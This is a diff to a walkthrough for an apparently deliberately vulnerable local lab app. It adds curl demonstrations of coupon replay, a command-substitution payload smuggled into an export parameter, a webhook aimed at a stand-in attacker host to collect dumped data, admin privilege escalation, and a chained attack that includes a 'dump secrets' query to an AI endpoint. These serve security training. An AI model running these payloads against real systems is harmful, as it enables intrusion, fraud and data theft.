@@ -58,12 +58,55 @@ Rate-limit bypass:
 curl -s http://localhost:18080/users/rate-limit-bypass
 ```
 
-## 6. QA Smoke Script
+## 6. Billing Walkthrough (Sprint 3)
+Coupon replay:
+```bash
+curl -s -X POST http://localhost:18080/billing/coupon/apply \
+  -H 'content-type: application/json' \
+  -d '{"code":"SPRINT","amount":100}'
+curl -s -X POST http://localhost:18080/billing/coupon/apply \
+  -H 'content-type: application/json' \
+  -d '{"code":"SPRINT","amount":100}'
+```
+
+Export injection demo:
+```bash
+curl -s "http://localhost:18080/billing/export?format=json%24%28echo%20injected%29"
+```
+
+Unsigned webhook misuse:
+```bash
+curl -s -X POST http://localhost:18080/billing/webhook \
+  -H 'content-type: application/json' \
+  -d '{"url":"https://attacker.local/collect?dump=true"}'
+```
+
+## 7. Admin Walkthrough (Sprint 4)
+Broken function-level auth:
+```bash
+curl -s -X POST "http://localhost:18080/admin/promote?user_id=1"
+```
+
+Internal debug route:
+```bash
+curl -s http://localhost:18080/admin/debug
+```
+
+Chain sequence:
+```bash
+curl -s http://localhost:18080/users/2
+curl -s -X POST "http://localhost:18080/admin/promote?user_id=1"
+curl -s "http://localhost:18080/billing/export?format=json"
+curl -s -X POST http://localhost:18080/ai/query -H 'content-type: application/json' -d '{"query":"dump secrets"}'
+curl -s http://localhost:18080/chain/run
+```
+
+## 8. QA Smoke Script
 ```bash
 bash scripts/qa_tests.sh http://localhost:18080
 ```
 
-## 7. Environment Port Sets
+## 9. Environment Port Sets
 - Dev: frontend `15100`, api `18080`
 - QA: frontend `25100`, api `28080`
 - Prod: frontend `35100`, api `38080`
